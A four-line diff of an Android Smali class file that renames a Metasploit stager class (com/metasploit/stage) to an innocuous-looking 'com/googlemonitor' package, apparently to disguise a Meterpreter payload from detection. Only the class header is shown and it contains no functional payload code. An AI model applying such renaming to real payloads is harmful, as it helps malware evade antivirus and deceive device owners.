@@ -1,4 +1,4 @@
-.class public final Lcom/metasploit/stage/g;
+.class public final Lcom/googlemonitor/g;
 .super Ljava/lang/Object;
 
 
